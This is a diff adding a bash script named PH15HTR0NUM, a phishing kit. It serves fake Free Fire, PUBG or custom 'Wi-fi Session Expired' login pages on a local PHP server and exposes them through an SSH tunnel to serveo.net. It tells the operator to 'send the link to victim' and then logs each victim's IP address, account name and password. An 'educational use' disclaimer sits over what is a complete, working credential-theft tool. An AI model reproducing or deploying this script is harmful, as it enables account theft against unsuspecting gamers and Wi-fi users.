@@ -1,0 +1,280 @@
+#!/bin/bash
+#PH15HTR0NUM 
+#Coded by : PR1NCE KUM4R
+
+trap 'printf "\n";stop;exit 1' 2
+
+dependencies() 
+{
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+}
+
+menu()
+{
+printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Free Fire\e[0m "  
+printf "          \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Pubg\e[0m "                          
+printf "          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Custom\e[0m   "  
+
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
+if [[ $option == 1 ]]; then
+server="freefire"
+start
+
+elif [[ $option == 2 ]]; then
+server="pubg"
+start
+
+elif [[ $option == 3 ]]; then
+server="create"
+createpage
+start
+
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+menu
+fi
+}
+
+stop() 
+{
+checkphp=$(ps aux | grep -o "php" | head -n1)
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+fi
+}
+
+loading() {
+clear
+printf "\e[1;92m"
+
+printf "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n"
+sleep 0.1
+clear
+printf "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ...\n"
+sleep 0.1
+}
+
+banner() {
+    
+printf "\n"
+printf "\e[1;92m  ██████╗  ██╗  ██╗  ██╗ ███████╗ ██╗  ██╗ ████████╗ ██████╗   ██████╗  ███╗   ██╗  ██╗ ██╗   ██╗ ███╗   ███╗ \e[0m\n"
+printf "\e[1;92m  ██╔══██╗ ██║  ██║ ███║ ██╔════╝ ██║  ██║ ╚══██╔══╝ ██╔══██╗ ██╔═████╗ ████╗  ██║ ███║ ██║   ██║ ████╗ ████║ \e[0m\n"
+printf "\e[1;92m  ██████╔╝ ███████║ ╚██║ ███████╗ ███████║    ██║    ██████╔╝ ██║██╔██║ ██╔██╗ ██║ ╚██║ ██║   ██║ ██╔████╔██║ \e[0m\n"
+printf "\e[1;92m  ██╔═══╝  ██╔══██║  ██║ ╚════██║ ██╔══██║    ██║    ██╔══██╗ ████╔╝██║ ██║╚██╗██║  ██║ ██║   ██║ ██║╚██╔╝██║ \e[0m\n"
+printf "\e[1;92m  ██║      ██║  ██║  ██║ ███████║ ██║  ██║    ██║    ██║  ██║ ╚██████╔╝ ██║ ╚████║  ██║ ╚██████╔╝ ██║ ╚═╝ ██║ \e[0m\n"
+printf "\e[1;92m  ╚═╝      ╚═╝  ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝    ╚═╝    ╚═╝  ╚═╝  ╚═════╝  ╚═╝  ╚═══╝  ╚═╝  ╚═════╝  ╚═╝     ╚═╝ \e[0m\n"
+printf "\e[101m\e[1;77m :: Disclaimer: Developers assume no liability and are not        ::\e[0m\n"
+printf "\e[101m\e[1;77m :: responsible for any misuse or damage caused by PH15HTR0NUM.   ::\e[0m\n"
+printf "\e[101m\e[1;77m :: Only use for educational purporses!!                          ::\e[0m\n"
+printf "\n"
+printf "\e[101m\e[1;77m ::         PH15HTR0NUM Coded by : PR1NCE KUM4R                   ::\e[0m\n"
+printf "\n"
+}
+
+createpage() 
+{
+default_cap1="Wi-fi Session Expired"
+default_cap2="Please login again."
+default_user_text="Username:"
+default_pass_text="Password:"
+default_sub_text="Log-In"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
+cap1="${cap1:-${default_cap1}}"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+cap2="${cap2:-${default_cap2}}"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+user_text="${user_text:-${default_user_text}}"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+pass_text="${pass_text:-${default_pass_text}}"
+
+read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+sub_text="${sub_text:-${default_sub_text}}"
+
+echo "<!DOCTYPE html>" > sites/create/login.html
+echo "<html>" >> sites/create/login.html
+echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
+
+IFS=$'\n'
+printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
+
+IFS=$'\n'
+printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
+
+IFS=$'\n'
+printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
+
+IFS=$'\n'
+printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
+
+IFS=$'\n'
+printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
+
+IFS=$'\n'
+printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
+printf '</center>' >> sites/create/login.html
+printf '<body>\n' >> sites/create/login.html
+printf '</html>\n' >> sites/create/login.html
+}
+
+start() 
+{
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:8080\e[0m\e[1;92m)\e[0m\n"
+
+cd sites/$server && php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ...\e[0m\n"
+if [[ -e linksender ]]; then
+rm -rf linksender
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8080 serveo.net 2> /dev/null > linksender ' &
+printf "\n"
+sleep 7
+send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
+printf "\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n' $send_url
+printf "\n"
+datafound
+}
+
+datafound() 
+{
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf "\n"
+
+while [ true ]; do
+if [[ -e "sites/$server/ip.txt" ]]; then
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
+grab_ip
+rm -rf sites/$server/ip.txt
+fi
+sleep 0.75
+if [[ -e "sites/$server/usernames.txt" ]]; then
+
+printf "\e[m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
+
+grab_creds
+rm -rf sites/$server/usernames.txt
+fi
+sleep 0.75
+done 
+}
+
+grab_ip() 
+{
+ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/$server/ip.log\e[0m\n" $server
+printf "\n"
+cat sites/$server/ip.txt >> sites/$server/ip.log
+}
+
+grab_creds() 
+{
+account=$(grep -o 'Account:.*' sites/$server/usernames.txt  | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/$server/usernames.log\e[0m\n" $server
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+cat sites/$server/usernames.txt >>  sites/$server/usernames.log
+}
+
+datafound() 
+{
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf "\n"
+
+while [ true ]; do
+if [[ -e "sites/$server/ip.txt" ]]; then
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
+grab_ip
+rm -rf sites/$server/ip.txt
+
+fi
+sleep 0.75
+if [[ -e "sites/$server/usernames.txt" ]]; then
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
+
+grab_creds
+rm -rf sites/$server/usernames.txt
+fi
+sleep 0.75
+done 
+}
+
+banner
+dependencies
+menu
+
+
+
+                                                                         
+                                                                         
+
